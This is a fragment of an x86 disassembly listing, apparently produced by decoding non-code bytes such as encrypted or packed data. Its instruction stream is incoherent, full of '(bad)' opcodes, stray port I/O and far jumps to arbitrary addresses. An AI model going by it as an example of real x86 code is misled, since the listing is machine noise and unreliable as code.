  40dcaa:	sub    edi,DWORD PTR [eax-0x66847edc]
  40dcb0:	xor    eax,0xc925a1e4
  40dcb5:	xor    ebx,eax
  40dcb7:	fwait
  40dcb8:	ret    0xff83
  40dcbb:	mov    edx,0x4af321c8
  40dcc0:	pop    ebx
  40dcc1:	div    edx
  40dcc3:	loope  0x40dd22
  40dcc5:	and    al,0xd2
  40dcc7:	lds    esi,FWORD PTR [esp+edi*8]
  40dcca:	dec    edx
  40dccb:	xchg   ebx,eax
  40dccc:	mov    edi,0x1d966b90
  40dcd1:	jmp    0x9b2a:0xd52e1faa
  40dcd8:	addr16 jae 0x40dd31
  40dcdb:	push   cs
  40dcdc:	iret   
  40dcdd:	shr    DWORD PTR [ebp-0x35],1
  40dce0:	push   cs
  40dce1:	xchg   esi,eax
  40dce2:	sbb    ecx,edi
  40dce4:	push   edx
  40dce5:	rcl    BYTE PTR [ecx-0x3c],0xb9
  40dce9:	add    DWORD PTR [ecx+0x8dcac67],edx
  40dcef:	(bad)  
  40dcf0:	lock daa 
  40dcf2:	daa    
  40dcf3:	xchg   ebx,eax
  40dcf4:	repnz out dx,al
  40dcf6:	mov    cl,0xa8
  40dcf8:	test   DWORD PTR [edi-0x77e85f79],edi
  40dcfe:	repz or ecx,DWORD PTR [ebx-0x2c36aba7]
  40dd05:	xor    dl,cl
  40dd07:	adc    esi,DWORD PTR [edi]
  40dd09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd0a:	and    dl,0x70
  40dd0d:	dec    ecx
  40dd0e:	fistp  QWORD PTR [ebx-0x34c48484]
  40dd14:	or     ecx,esi
  40dd16:	xchg   bh,al
  40dd18:	stc    
  40dd19:	dec    ebp
  40dd1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd1b:	int    0x99
  40dd1d:	jae    0x40dd03
  40dd1f:	adc    eax,0x6fa7f215
  40dd24:	pop    ax
  40dd26:	fisubr DWORD PTR [edx-0x7e20c638]
  40dd2c:	mov    ecx,0xb6d9b837
  40dd31:	inc    edi
  40dd32:	in     al,0x2
  40dd34:	stos   DWORD PTR es:[edi],eax
  40dd35:	loope  0x40dd2e
  40dd37:	aam    0xc0
  40dd39:	mov    al,ds:0xc58c6f73
  40dd3e:	icebp  
  40dd3f:	jp     0x40dd63
  40dd41:	fbstp  TBYTE PTR [esi]
  40dd43:	test   esi,ebp
  40dd45:	add    ah,BYTE PTR [ecx-0x512fb24b]
  40dd4b:	fucomip st,st(0)
  40dd4d:	or     DWORD PTR [eax+0x6f7229b7],0xebeef3e0
  40dd57:	push   cs
  40dd58:	xchg   edi,eax
  40dd59:	lods   al,BYTE PTR ds:[esi]
  40dd5a:	retf   
  40dd5b:	dec    edx
  40dd5c:	shl    ebx,1
  40dd5e:	push   ecx
  40dd5f:	es dec edi
  40dd61:	xor    eax,0x97377815
  40dd66:	das    
  40dd67:	aaa    
  40dd68:	mov    BYTE PTR [edx],al
  40dd6a:	aas    
  40dd6b:	repz or DWORD PTR [ebx+eiz*4+0x441dccb5],edx
  40dd73:	ret    0xbf9f
  40dd76:	or     al,0x70
  40dd78:	inc    ebp
  40dd79:	sbb    bx,bp
  40dd7c:	add    bl,BYTE PTR [edi]
  40dd7e:	mov    gs,WORD PTR [edx*2-0x2a663bbf]
  40dd85:	lock mov bl,0x70
  40dd88:	cdq    
  40dd89:	jl     0x40ddb7
  40dd8b:	popa   
  40dd8c:	mov    al,0x66
  40dd8e:	lds    edx,FWORD PTR [eax+0x574bca79]
  40dd94:	jb     0x40ddd3
  40dd96:	and    eax,0xae75858c
  40dd9b:	aam    0x67
  40dd9d:	sbb    esi,DWORD PTR [eax+edi*4-0x45df64fe]
  40dda4:	pop    esp
  40dda5:	pop    ds
  40dda6:	imul   esi,DWORD PTR [edx-0x51],0x197db00c
  40ddad:	aas    
  40ddae:	push   ss
  40ddaf:	jo     0x40ddb5
  40ddb1:	shr    ch,0x3f
  40ddb4:	xchg   edi,eax
  40ddb5:	mov    esp,0xa7632c69
  40ddba:	add    bh,BYTE PTR [ecx+0x64c40e94]
  40ddc0:	cmp    edi,ebx
  40ddc2:	cld    
  40ddc3:	int3   
  40ddc4:	jbe    0x40ddac
  40ddc6:	mov    gs,WORD PTR [ebp+esi*2+0x6425d171]
  40ddcd:	mov    ds:0xe807e1d7,eax
  40ddd2:	mov    dh,BYTE PTR [si]
  40ddd5:	inc    edx
  40ddd6:	into   
  40ddd7:	mov    BYTE PTR [ebp-0x4f304a82],al
  40dddd:	dec    edi
  40ddde:	or     BYTE PTR [ecx],cl
  40dde0:	adc    eax,ebp
  40dde2:	mov    WORD PTR [ebx],ss
  40dde4:	dec    ecx
  40dde5:	repnz fist DWORD PTR [ecx+0x10]
  40dde9:	fs pop ebp
  40ddeb:	(bad)  
  40ddec:	mov    edx,0x48ae9563
  40ddf1:	cmp    bh,BYTE PTR ds:0x1758896b
  40ddf7:	add    al,0x7a
  40ddf9:	or     BYTE PTR [ebp-0x4e],0x44
  40ddfd:	fstp   QWORD PTR [eax-0x662f90c8]
  40de03:	leave  
  40de04:	adc    al,0xb4
  40de06:	sahf   
  40de07:	mov    esi,es
  40de09:	pop    esi
  40de0a:	(bad)  
  40de0c:	xchg   ecx,eax
  40de0d:	adc    BYTE PTR ds:0x215b8055,0x36
  40de14:	cmp    al,0xa8
  40de16:	xor    dl,BYTE PTR [ebx-0x74ae2f7d]
  40de1c:	push   eax
  40de1d:	or     eax,0x426de509
  40de22:	pop    esi
  40de23:	xor    eax,0xffffff8f
  40de26:	sbb    BYTE PTR es:[ecx+0x1948a230],0x55
  40de2e:	(bad)  
  40de2f:	mov    ebx,0x2f00bf5f
  40de34:	inc    edi
  40de35:	push   esi
  40de36:	lods   al,BYTE PTR ds:[esi]
  40de37:	xchg   ebp,eax
  40de38:	loop   0x40ddfc
  40de3a:	jmp    0x40de2a
  40de3c:	and    DWORD PTR [ebx+0x7264fedc],esp
  40de42:	mov    ebp,0x97b1b2df
  40de47:	inc    ebp
  40de48:	pop    ds
  40de49:	cmc    
  40de4a:	xor    BYTE PTR [esp+edi*2],cl
  40de4d:	push   esp
  40de4e:	jne    0x40de4a
  40de50:	cmp    DWORD PTR [esp+eiz*4],edx
  40de53:	dec    edi
  40de54:	fist   DWORD PTR [eax-0x73]
  40de57:	push   0xffffff9e
  40de59:	inc    ebp
  40de5a:	xor    eax,0x42ab5ef7
  40de5f:	xchg   esp,eax
  40de60:	addr16 lahf 
  40de62:	mov    ecx,0x4041ec10
  40de67:	stos   BYTE PTR es:[edi],al
  40de68:	mov    dh,0x76
  40de6a:	xor    ch,ah
  40de6c:	or     eax,0xed9936f2
  40de71:	ret    
  40de72:	out    dx,al
  40de73:	ins    BYTE PTR es:[edi],dx
  40de74:	mov    ds:0xfccbb532,al
  40de79:	in     al,0xa8
  40de7b:	inc    eax
  40de7c:	push   eax
  40de7d:	scas   al,BYTE PTR es:[edi]
  40de7e:	ds jge 0x40deea
  40de81:	jb     0x40de39
  40de83:	pop    ebx
  40de84:	dec    esi
  40de85:	daa    
  40de86:	ins    BYTE PTR es:[edi],dx
  40de87:	adc    eax,0x21a148b0
  40de8c:	hlt    
  40de8d:	shr    DWORD PTR [ecx+edi*2-0x6ce1307f],0x4a
  40de95:	jae    0x40de2c
  40de97:	in     al,dx
  40de98:	fisub  WORD PTR [esi-0xa301648]
  40de9e:	jecxz  0x40df11
  40dea0:	je     0x40defd
  40dea2:	mov    ch,0x1a
  40dea4:	sub    esi,DWORD PTR [ebp+0x4d]
  40dea7:	and    eax,0xfe6cff63
  40deac:	sub    al,0x8e
  40deae:	pop    ss
  40deaf:	jns    0x40dee1
  40deb1:	or     al,0xd0
  40deb3:	stc    
  40deb4:	in     eax,dx
  40deb5:	xor    eax,0xefee9a40
  40deba:	mov    ebx,0x44c52ebc
  40debf:	adc    ch,BYTE PTR [esi-0x5f50516c]
  40dec5:	jb     0x40deec
  40dec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dec8:	cmp    al,0xe3
  40deca:	out    dx,al
  40decb:	inc    esp
  40decc:	inc    edx
  40decd:	mov    ebp,0x15bdc9ce
  40ded2:	push   ds
  40ded3:	mov    ebp,0xf03ee4ef
  40ded8:	data16 cli 
  40deda:	sub    BYTE PTR [ebp-0x21],ch
  40dedd:	mov    edx,0x2252c4d2
  40dee2:	retf   0x1c18
  40dee5:	pop    ecx
  40dee6:	mov    dl,0xfc
  40dee8:	xor    eax,0x815072e5
  40deed:	pop    ss
  40deee:	enter  0xb75,0xd8
  40def2:	mov    edi,0x1bbfaa28
  40def7:	cdq    
  40def8:	jno    0x40dec5
  40defa:	adc    edi,DWORD PTR [esi]
  40defc:	cmp    eax,0xc47f9147
  40df01:	into   
  40df02:	enter  0x18be,0x73
  40df06:	or     eax,0x7d79a003
  40df0b:	pop    esp
  40df0c:	into   
  40df0d:	jne    0x40ded1
  40df0f:	fucom  st(0)
  40df11:	(bad)  
  40df12:	jmp    0x40df67
  40df14:	mov    dl,0x3b
  40df16:	push   cs
  40df17:	sahf   
  40df18:	fcomp  st(7)
  40df1a:	imul   ebp,DWORD PTR [ecx+edx*4],0xffffffa4
  40df1e:	pushf  
  40df1f:	test   BYTE PTR [edx+eax*2],al
  40df22:	js     0x40df47
  40df24:	xchg   esi,eax
  40df25:	bound  esp,QWORD PTR [ebx+0xcb316d1]
  40df2b:	retf   
  40df2c:	aaa    
  40df2d:	sub    bl,ah
  40df2f:	push   edi
  40df30:	loopne 0x40df4d
  40df32:	fistp  WORD PTR [esi]
  40df34:	adc    cl,BYTE PTR [edx]
  40df36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df37:	cmp    eax,0x8a7b9017
  40df3c:	(bad)  
  40df3e:	(bad)  
  40df3f:	mov    esi,0x3358f1c8
  40df44:	cs stos BYTE PTR es:[edi],al
  40df46:	cmp    BYTE PTR [eax-0x7fbda32f],ch
  40df4c:	lahf   
  40df4d:	enter  0x32f,0xfc
  40df51:	scas   eax,DWORD PTR es:[edi]
  40df52:	arpl   ax,bx
  40df54:	cld    
  40df55:	les    esp,FWORD PTR [ecx]
  40df57:	das    
  40df58:	xrelease mov DWORD PTR [eax],esp
  40df5b:	add    bl,BYTE PTR [esi]
  40df5d:	fwait
  40df5e:	lahf   
  40df5f:	pop    ecx
  40df60:	sub    ebp,ebx
  40df62:	dec    esi
  40df63:	push   es
  40df64:	in     eax,dx
  40df65:	ret    
  40df66:	daa    
  40df67:	ds push ss
  40df69:	lea    ebx,[esi-0x2776b01b]
  40df6f:	add    ch,BYTE PTR cs:[esi]
  40df72:	pop    ecx
  40df73:	jmp    DWORD PTR [ebx+eiz*8]
  40df76:	shr    BYTE PTR [eax-0x8f655fb],0x5e
  40df7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df7e:	sbb    dl,ah
  40df80:	fldcw  WORD PTR [edx-0x437af2b7]
  40df86:	inc    ecx
  40df87:	imul   eax,DWORD PTR ds:0xc1bd9008,0xffffff94
  40df8f:	add    DWORD PTR [esi-0x45],0x9d98587
  40df96:	cwde   
  40df97:	ds dec esi
  40df99:	stos   BYTE PTR es:[edi],al
  40df9a:	and    eax,0xccbd7988
  40df9f:	stos   BYTE PTR es:[edi],al
  40dfa0:	and    dh,BYTE PTR [ecx]
  40dfa2:	mov    al,0xd3
  40dfa4:	stos   BYTE PTR es:[edi],al
  40dfa5:	fs call 0x4111:0xc9716353
  40dfad:	fsub   DWORD PTR [ebx]
  40dfaf:	push   ecx
  40dfb0:	push   ds
  40dfb1:	fwait
  40dfb2:	mov    edi,0x37ad1909
  40dfb7:	dec    ebx
  40dfb8:	mov    esi,0x49c0397e
  40dfbd:	in     al,0x53
  40dfbf:	sub    DWORD PTR [edi],esp
  40dfc1:	cmp    al,0x33
  40dfc3:	das    
  40dfc4:	fucomi st,st(6)
  40dfc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfc7:	repnz shl DWORD PTR [ebx-0x2ce487ea],cl
  40dfce:	and    esi,esp
  40dfd0:	dec    esi
  40dfd1:	push   0x70
  40dfd3:	cmp    DWORD PTR [edx-0x6],edi
  40dfd6:	out    0x30,al
  40dfd8:	loopne 0x40df91
  40dfda:	scas   al,BYTE PTR es:[edi]
  40dfdb:	add    edx,DWORD PTR [esi+ebp*4-0x51610654]
  40dfe2:	pusha  
  40dfe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfe4:	mov    dh,0x49
  40dfe6:	mov    esi,0xfea4577a
  40dfeb:	repz sub eax,0xde4db621
  40dff1:	je     0x40dfd1
  40dff3:	cli    
  40dff4:	add    al,0xa8
  40dff6:	cmp    al,0x43
  40dff8:	xchg   BYTE PTR [ecx+0x105df435],al
  40dffe:	cs jle 0x40e000
  40e001:	inc    ebp
  40e002:	ret    0x2216
  40e005:	adc    esi,DWORD PTR [eax+0x3]
  40e008:	aad    0xe2
  40e00a:	lds    edx,FWORD PTR [esi-0x61]
  40e00d:	out    0xa,al
  40e00f:	mov    dl,cl
  40e011:	jo     0x40e007
  40e013:	add    esp,esi
  40e015:	xor    DWORD PTR [ebx],esi
  40e017:	popf   
  40e018:	ffree  st(6)
  40e01a:	pop    esi
  40e01b:	inc    edx
  40e01c:	sbb    cl,dl
  40e01e:	test   eax,0x5426fbaf
  40e023:	add    bh,BYTE PTR [eax+0x4ec44d2e]
  40e029:	repz cmp DWORD PTR [esi+0x15094dd],0x42
  40e031:	mov    BYTE PTR ds:0x1f1c3f9e,ch
  40e037:	fbstp  TBYTE PTR [edx-0x27eeca4c]
  40e03d:	enter  0x4560,0x1d
  40e041:	(bad)  
  40e042:	hlt    
  40e043:	ret    0x67d3
  40e046:	inc    eax
  40e047:	or     dl,BYTE PTR [edx]
  40e049:	xor    eax,DWORD PTR [eax]
  40e04b:	sub    cl,al
  40e04d:	cli    
  40e04e:	dec    eax
  40e04f:	and    al,0xb2
  40e051:	cmc    
  40e052:	int3   
  40e053:	jmp    0x32db:0x57215a67
  40e05a:	in     eax,dx
  40e05b:	pusha  
  40e05c:	sahf   
  40e05d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e05e:	div    DWORD PTR [ebp+0x78]
  40e061:	sub    cl,BYTE PTR [ecx-0x6a956bfe]
  40e067:	popa   
  40e068:	sbb    al,0xed
  40e06a:	mov    ds:0x266b3295,al
  40e06f:	mov    eax,ds:0x6d50c5f1
  40e074:	pop    edx
  40e075:	outs   dx,BYTE PTR ds:[esi]
  40e076:	push   edi
  40e077:	aaa    
  40e078:	xor    al,0xaa
  40e07a:	inc    edi
  40e07b:	cmp    al,0x1c
  40e07d:	pop    ds
  40e07e:	mov    dh,0x4f
  40e080:	or     eax,DWORD PTR [ebx]
  40e082:	dec    ebp
  40e083:	pop    edi
  40e084:	push   ss
  40e085:	out    dx,al
  40e086:	(bad)  
  40e088:	int3   
  40e089:	cmp    BYTE PTR [ebx],dh
  40e08b:	ds mov bh,0x3a
  40e08e:	stos   BYTE PTR es:[edi],al
  40e08f:	push   eax
  40e090:	es dec ebx
  40e092:	add    BYTE PTR [ecx+0x4273814d],0xd8
  40e099:	aad    0x8a
  40e09b:	mov    BYTE PTR [eax-0x32c9b426],ch
  40e0a1:	pop    ecx
  40e0a2:	ja     0x40e06d
  40e0a4:	cmp    al,0x37
  40e0a6:	outs   dx,DWORD PTR ds:[esi]
  40e0a7:	in     eax,dx
  40e0a8:	inc    ebp
  40e0a9:	jbe    0x40e04f
  40e0ab:	shl    BYTE PTR [esi+0x542c6397],1
  40e0b1:	dec    edi
  40e0b2:	cld    
  40e0b3:	and    DWORD PTR [edx-0x3a],edi
  40e0b6:	cmc    
  40e0b7:	(bad)  
  40e0b8:	or     bh,BYTE PTR [edi-0x69]
  40e0bb:	mov    eax,ds:0x58af94a9
  40e0c0:	xchg   esi,eax
  40e0c1:	and    bl,al
  40e0c3:	call   0xc878af22
  40e0c8:	inc    ebp
  40e0c9:	inc    ecx
  40e0ca:	daa    
  40e0cb:	or     edx,DWORD PTR [esi]
  40e0cd:	out    dx,al
  40e0ce:	push   0x2f
  40e0d0:	or     eax,0xcf618a0
  40e0d5:	loop   0x40e0d6
  40e0d7:	add    DWORD PTR [ebp-0x40],eax
  40e0da:	lock add edi,DWORD PTR [esi]
  40e0dd:	ins    DWORD PTR es:[edi],dx
  40e0de:	and    ecx,DWORD PTR [ebx]
  40e0e0:	in     eax,dx
  40e0e1:	int3   
  40e0e2:	aaa    
  40e0e3:	lahf   
  40e0e4:	and    al,0x4
  40e0e6:	mov    ds:0xc9c78dad,eax
  40e0eb:	cmp    eax,DWORD PTR [edi-0x3dfa4708]
  40e0f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0f2:	retf   
  40e0f3:	pushf  
  40e0f4:	cmp    eax,DWORD PTR [eax+0x37e1fccf]
  40e0fa:	repz in eax,0xc
  40e0fd:	scas   eax,DWORD PTR es:[edi]
  40e0fe:	ret    
  40e0ff:	mov    gs,WORD PTR [ecx+eiz*8-0x27513d84]
  40e106:	cmp    eax,0xc21dc6f9
  40e10b:	mov    ds:0x733f40ad,al
  40e110:	scas   eax,DWORD PTR es:[edi]
  40e111:	je     0x40e0bf
  40e113:	push   ebp
  40e114:	cmp    eax,0x9a5fd8e6
  40e119:	jbe    0x40e18f
  40e11b:	int3   
  40e11c:	outs   dx,BYTE PTR ds:[esi]
  40e11d:	mov    ah,0xd3
  40e11f:	fwait
  40e120:	xor    DWORD PTR [ebx+0x65],0xffffff80
  40e124:	sub    edi,DWORD PTR [ecx-0x10c2d6c4]
  40e12a:	dec    edx
  40e12b:	out    0x91,eax
  40e12d:	pop    ss
  40e12e:	adc    eax,0xd03d975
  40e133:	or     ebx,ebx
  40e135:	mov    ebp,0x6d9b3181
  40e13a:	push   edx
  40e13b:	jge    0x40e174
  40e13d:	je     0x40e177
  40e13f:	jecxz  0x40e164
  40e141:	ret    
  40e142:	cs push eax
  40e144:	mov    dh,0xb7
  40e146:	add    BYTE PTR [esp+esi*2],al
  40e149:	scas   eax,DWORD PTR es:[edi]
  40e14a:	out    dx,eax
  40e14b:	cmc    
  40e14c:	popf   
  40e14d:	ins    BYTE PTR es:[edi],dx
  40e14e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e14f:	adc    al,0x6b
  40e151:	test   eax,0xe7b989fa
  40e156:	mov    esi,0xb8a68f52
  40e15b:	out    dx,al
  40e15c:	call   0x5a9a:0x4914ea8a
  40e163:	sbb    cl,BYTE PTR [edx+0x6e]
  40e166:	or     dl,BYTE PTR [eax]
  40e168:	lahf   
  40e169:	sbb    DWORD PTR [edi+0x2c6f2920],eax
  40e16f:	jo     0x40e1de
  40e171:	mov    al,0x29
  40e173:	or     BYTE PTR [eax],al
  40e175:	sbb    WORD PTR [ebp-0x71d636d1],sp
  40e17c:	(bad)  
  40e17e:	or     ch,BYTE PTR [ebx+0x0]
  40e181:	ds aad 0x10
  40e184:	loopne 0x40e128
  40e186:	jg     0x40e167
  40e188:	sub    ecx,DWORD PTR [eax]
  40e18a:	test   DWORD PTR [ecx+0x3f],edi
  40e18d:	xchg   esp,eax
  40e18e:	and    DWORD PTR [eax-0x26],ebp
  40e191:	or     ah,BYTE PTR [edi]
  40e193:	push   esp
  40e195:	mov    esp,0xe33bcc64
  40e19a:	jl     0x40e1fc
  40e19c:	cmp    eax,0x835a00d6
  40e1a1:	mov    esi,DWORD PTR [ecx-0x80]
  40e1a4:	sti    
  40e1a5:	sbb    DWORD PTR [eax-0x176d0a32],ecx
  40e1ab:	add    bh,dh
  40e1ad:	push   ecx
  40e1ae:	jnp    0x40e147
  40e1b0:	pusha  
  40e1b1:	sub    esi,edi
  40e1b3:	and    al,0x7
  40e1b5:	jo     0x40e165
  40e1b7:	pop    esi
  40e1b8:	xchg   edi,eax
  40e1b9:	shr    ch,0xef
  40e1bc:	xor    dh,BYTE PTR [esi+0xc]
  40e1bf:	inc    ebx
  40e1c0:	dec    edx
  40e1c1:	jae    0x40e1b5
  40e1c3:	fist   DWORD PTR [esi+0x25]
  40e1c6:	or     ebp,eax
  40e1c8:	mul    BYTE PTR [ebx+0x65675cd]
  40e1ce:	and    dl,BYTE PTR [ebp-0x52]
  40e1d1:	cmp    al,0x19
  40e1d3:	retf   
  40e1d4:	int3   
  40e1d5:	inc    ecx
  40e1d6:	inc    esi
  40e1d7:	jb     0x40e225
  40e1d9:	xor    al,0x5b
  40e1db:	pop    ss
  40e1dc:	arpl   WORD PTR [eax+0x508d5679],sp
  40e1e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1e3:	push   es
  40e1e4:	pop    ds
  40e1e5:	cmp    BYTE PTR [ebx],cl
  40e1e7:	dec    edi
  40e1e8:	(bad)  
  40e1e9:	ficom  DWORD PTR [ebp+0x109013ce]
  40e1ef:	adc    al,0x48
  40e1f1:	jmp    0x40e1b1
  40e1f3:	mov    ecx,ecx
  40e1f5:	jecxz  0x40e1b4
  40e1f7:	stc    
  40e1f8:	cmp    edi,esi
  40e1fa:	sub    BYTE PTR [ecx-0x5a4eeef1],bh
  40e200:	or     edi,ebp
  40e202:	jl     0x40e26e
  40e204:	shl    DWORD PTR [eax+esi*8],0x90
  40e208:	rol    DWORD PTR [bp+di-0x69e7],1
  40e20d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e20e:	xor    eax,DWORD PTR [eax]
  40e210:	inc    eax
  40e211:	test   BYTE PTR [ecx],dl
  40e213:	cs jge 0x40e263
  40e216:	push   es
  40e217:	lods   eax,DWORD PTR ds:[esi]
  40e218:	inc    esp
  40e219:	loopne 0x40e209
  40e21b:	mov    al,0x9d
  40e21d:	mov    ch,0x13
  40e21f:	push   ds
  40e220:	mov    dl,0x89
  40e222:	ret    
  40e223:	or     DWORD PTR [edi+edi*2+0x49735b08],ebx
  40e22a:	rcr    BYTE PTR [edx],cl
  40e22c:	xor    esp,DWORD PTR [ebx-0x772de7a]
  40e232:	xor    al,0xa2
  40e234:	xchg   esp,eax
  40e235:	jecxz  0x40e248
  40e237:	push   esi
  40e238:	ret    0xabbd
  40e23b:	push   es
  40e23c:	push   eax
  40e23d:	aad    0xef
  40e23f:	fmul   QWORD PTR fs:[ebx+0x36f8701a]
  40e246:	cmp    edx,ebp
  40e248:	pop    edx
  40e249:	or     ebx,DWORD PTR [ebx+0x53]
  40e24c:	mov    esi,0xd4280a6e
  40e251:	cdq    
  40e252:	mov    al,0xbf
  40e254:	mov    dl,0x3b
  40e256:	pusha  
  40e257:	jp     0x40e26c
  40e259:	dec    BYTE PTR [esi-0x21176c5d]
  40e25f:	inc    esp
  40e260:	mov    WORD PTR [ebx],?
  40e262:	pop    esi
  40e263:	pop    edi
  40e264:	pop    ebp
  40e265:	mov    DWORD PTR [eax],ecx
  40e267:	jae    0x40e2af
  40e269:	push   0xc7be8388
  40e26e:	push   0xfffffff8
  40e270:	pop    edx
  40e271:	(bad)  [ebx+0x6448eb42]
  40e277:	cld    
  40e278:	adc    DWORD PTR [edi-0x397cd5b5],edx
  40e27e:	aas    
  40e27f:	sbb    BYTE PTR [edi+0x5f2c0489],bl
  40e285:	mov    BYTE PTR [eax-0x1f],al
  40e288:	div    DWORD PTR [eax+ebx*4+0x6b]
  40e28c:	sti    
  40e28d:	push   ds
  40e28e:	pop    ecx
  40e28f:	mov    edx,0x85ec72cf
  40e294:	scas   al,BYTE PTR es:[edi]
  40e295:	aad    0x98
  40e297:	mov    ebp,0xcdd13d84
  40e29c:	arpl   WORD PTR ds:0x96123ddf,sp
  40e2a2:	adc    eax,0xfa94fdd1
  40e2a7:	add    al,0xeb
  40e2a9:	js     0x40e2ae
  40e2ab:	call   0x5e03877
  40e2b0:	arpl   WORD PTR [ecx-0x373f5034],dx
  40e2b6:	fstp   QWORD PTR [edx-0x17c03b3c]
  40e2bc:	stc    
  40e2bd:	dec    edi
  40e2be:	add    bh,ch
  40e2c0:	lock ficom DWORD PTR [esi-0x6e53a481]
  40e2c7:	xchg   esi,eax
  40e2c8:	mov    ah,0x76
  40e2ca:	(bad)  
  40e2cb:	(bad)  [edx+0x72a5786e]
  40e2d1:	adc    DWORD PTR [ebp-0x2c],edi
  40e2d4:	mov    ebx,DWORD PTR [eax-0x483cc40e]
  40e2da:	and    eax,0x9c6474a5
  40e2df:	jge    0x40e335
  40e2e1:	in     eax,dx
  40e2e2:	push   0xffffff9b
  40e2e4:	add    BYTE PTR [eax],bh
  40e2e6:	or     dl,BYTE PTR [edx+0x74998b2a]
  40e2ec:	and    al,0xb
  40e2ee:	iret   
  40e2ef:	push   0xffffffa3
  40e2f1:	xchg   ebp,eax
  40e2f2:	retf   0xadd3
  40e2f5:	mov    dh,0xdc
  40e2f7:	int3   
  40e2f8:	ret    0xbf2e
  40e2fb:	and    BYTE PTR [edi-0x3d],bl
  40e2fe:	and    eax,0x8d26132d
  40e303:	pop    edx
  40e304:	cmp    al,0x7e
  40e306:	je     0x40e33d
  40e308:	inc    eax
  40e309:	idiv   DWORD PTR [ecx-0x22]
  40e30c:	sub    ecx,DWORD PTR [esi]
  40e30e:	mov    ebx,0x72140790
  40e313:	repnz (bad) 
  40e315:	sub    eax,0xedfcb0e0
  40e31a:	lds    esp,FWORD PTR [eax-0x6ee1c89a]
  40e320:	js     0x40e339
  40e322:	inc    edi
  40e323:	add    eax,0x28136f9f
  40e328:	xchg   eax,ecx
  40e32a:	cmp    DWORD PTR [ecx+ebx*2],0x8e2c57b9
  40e331:	sbb    eax,0xed0888db
  40e336:	adc    BYTE PTR [edx-0xbb7c4df],al
  40e33c:	js     0x40e31d
  40e33e:	stos   BYTE PTR es:[edi],al
  40e33f:	add    edx,DWORD PTR fs:[ebp-0x5e31b358]
  40e346:	jae    0x40e2e3
  40e348:	int    0x61
  40e34a:	cmp    eax,0x656a2551
  40e34f:	jae    0x40e334
  40e351:	mov    ds:0x6580829b,al
  40e356:	and    eax,esp
  40e358:	adc    al,0xf5
  40e35a:	xchg   edi,eax
  40e35b:	inc    ebp
  40e35c:	outs   dx,DWORD PTR ds:[esi]
  40e35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e35e:	xchg   edi,eax
  40e35f:	cs popa 
  40e361:	mov    bh,0x56
  40e363:	push   ds
  40e364:	test   ebp,ecx
  40e366:	gs fcmovb st,st(2)
  40e369:	push   0xf78e67cc
  40e36e:	aas    
  40e36f:	mov    dl,0xc6
  40e371:	xor    al,0xe8
  40e373:	(bad)  
  40e374:	test   al,0xd3
  40e376:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e377:	rcl    BYTE PTR [ecx],cl
  40e379:	(bad)  
  40e37b:	or     bl,0x59
  40e37e:	mov    bh,0xa9
  40e380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e381:	add    al,0x6f
  40e383:	cs xchg ebx,eax
  40e385:	push   esi
  40e386:	inc    esi
  40e387:	mov    ds:0x1b09e3e,al
  40e38c:	mov    eax,0x33bc24c2
  40e391:	and    bl,ch
  40e393:	cld    
  40e394:	stc    
  40e395:	push   0x81527e8c
  40e39a:	out    0x3a,eax
  40e39c:	mov    ebp,cs
  40e39e:	xor    esp,ebp
  40e3a0:	lea    edx,[ebp+0x2]
  40e3a3:	in     al,0xdc
  40e3a5:	js     0x40e3f4
  40e3a7:	inc    ebp
  40e3a8:	dec    ebx
  40e3a9:	push   ecx
  40e3aa:	(bad)  
  40e3ab:	popf   
  40e3ac:	xchg   DWORD PTR [esi],esi
  40e3ae:	nop
  40e3af:	xor    BYTE PTR [esi],bh
  40e3b1:	add    al,0xb0
  40e3b3:	aam    0x4b
  40e3b5:	sub    al,0x3
  40e3b7:	jo     0x40e420
  40e3b9:	mov    ebp,0xa39af735
  40e3be:	inc    ebp
  40e3bf:	aas    
  40e3c0:	cmp    dl,BYTE PTR [eax]
  40e3c2:	imul   ebp,DWORD PTR [edi],0xffffff93
  40e3c5:	std    
  40e3c6:	jmp    0xc6ba:0x7edecfde
  40e3cd:	jl     0x40e3f7
  40e3cf:	lods   eax,DWORD PTR ds:[esi]
  40e3d0:	nop
  40e3d1:	mov    eax,ds:0xa84fc0c0
  40e3d6:	adc    dl,BYTE PTR [eax-0x3a]
  40e3d9:	fprem  
  40e3db:	pop    edx
  40e3dc:	sbb    edx,DWORD PTR [ebx-0x42cbe8a7]
  40e3e2:	jmp    0xd44b:0x71e84dc9
  40e3e9:	mul    BYTE PTR [ecx]
  40e3eb:	ficom  WORD PTR [edi+0x31]
  40e3ee:	xchg   esp,eax
  40e3ef:	pop    ecx
  40e3f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3f1:	add    al,0x65
  40e3f3:	(bad)  
  40e3f4:	jnp    0x40e442
  40e3f6:	not    DWORD PTR [esi]
  40e3f8:	in     al,dx
  40e3f9:	adc    al,0x89
  40e3fb:	and    al,0x64
  40e3fd:	popf   
  40e3fe:	cld    
  40e3ff:	inc    esp
  40e400:	xor    eax,eax
  40e402:	xchg   ebp,ebx
  40e404:	or     BYTE PTR [esi],bh
  40e406:	xchg   edi,eax
  40e407:	jecxz  0x40e417
  40e409:	cdq    
  40e40a:	inc    ecx
  40e40b:	pop    eax
  40e40c:	ss sahf 
  40e40e:	push   0x2e
  40e410:	cld    
  40e411:	mov    ebx,0x1dd6284f
  40e416:	or     al,0x48
  40e418:	int    0x72
  40e41a:	dec    ebx
  40e41b:	call   0x17ee:0xd35db5e4
  40e422:	outs   dx,DWORD PTR ds:[esi]
  40e423:	dec    ebx
  40e424:	stc    
  40e425:	push   ss
